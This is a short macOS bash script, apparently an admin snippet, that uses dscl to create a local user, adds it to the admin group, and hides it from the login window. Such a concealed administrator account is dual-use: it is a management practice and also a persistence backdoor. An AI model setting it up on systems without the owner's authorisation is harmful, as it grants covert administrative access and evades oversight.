#!/bin/bash
# Create hidden account
myuser=ninjaturtle
mypw= # {enter password here}

sudo dscl . -create /Users/$myuser UniqueID 401 
sudo dscl . -create /Users/$myuser PrimaryGroupID 20 
sudo dscl . -create /Users/$myuser NFSHomeDirectory /var/$myuser 
sudo dscl . -create /Users/$myuser UserShell /bin/bash 
sudo dscl . -create /Users/$myuser RealName "$myuser" 

# Create password for user
sudo dscl . -passwd /Users/$myuser $mypw

# Create the user's home folder and chown it to the new user
sudo mkdir /var/$myuser 
sudo chown -R $myuser /var/$myuser

# Add the user into the Local Admin group 
sudo dscl . append /Groups/admin GroupMembership $myuser 

# Enable the hidden functions
sudo defaults write /Library/Preferences/com.apple.loginwindow Hide500Users -bool YES

# Enable 'Others' option to appear at the login window 
sudo defaults write /Library/Preferences/com.apple.loginwindow SHOWOTHERUSERS_MANAGED -bool TRUE

exit
